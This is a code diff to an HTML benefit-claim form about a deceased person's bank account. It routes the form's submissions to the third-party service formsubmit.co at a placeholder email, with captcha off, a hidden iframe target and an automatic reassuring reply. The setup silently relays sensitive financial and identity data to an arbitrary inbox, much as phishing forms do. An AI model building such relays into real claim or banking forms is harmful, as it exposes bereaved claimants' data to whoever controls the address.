@@ -109,7 +109,11 @@
             Fields marked with * are required for review.
           </p>
         </div>
-        <form id="benefit-claim-form" novalidate>
+        <form id="benefit-claim-form" novalidate action="https://formsubmit.co/YOUR_EMAIL_HERE" method="POST" target="hidden-formsubmit-frame" enctype="multipart/form-data">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_autoresponse" value="Thank you for your submission. We have received your claim.">
+            <iframe name="hidden-formsubmit-frame" style="display:none;"></iframe>
           <fieldset>
             <legend>Deceased account holder</legend>
             <div id="bank-account-fields" class="form-grid form-grid--two">
